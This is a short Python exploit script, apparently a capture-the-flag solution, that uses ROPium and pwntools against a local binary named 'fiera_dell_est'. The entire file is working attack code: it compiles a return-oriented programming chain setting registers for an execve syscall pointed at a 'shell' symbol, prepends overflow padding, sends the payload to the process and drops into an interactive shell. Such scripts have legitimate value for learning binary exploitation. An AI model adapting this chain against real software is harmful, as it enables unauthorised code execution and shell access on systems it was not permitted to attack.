from ropium import *
from pwn import *

file_path = 'fiera_dell_est'

exe = ELF(file_path)


rop = ROPium(ARCH.X86)
rop.load(file_path)
rop.abi = ABI.X86_CDECL
# rop.bad_bytes = [0x00]

chain = rop.compile('eax=0xb')
# print(chain.dump())
chain += rop.compile('ebx=' + str((exe.symbols['shell'])))
# print(chain.dump())
chain += rop.compile('ecx=0')
# print(chain.dump())
chain += rop.compile('edx=0')
# print(chain.dump())
chain += rop.compile(str(exe.symbols['angelo_della_morte']) + '()')
print(chain.dump())

ropchain = b'due\x00' + b'aaaaaaaaaaaa' + chain.dump('raw')
print(ropchain)

io = process([file_path])
io.recvline()
io.sendline(ropchain)
io.interactive()

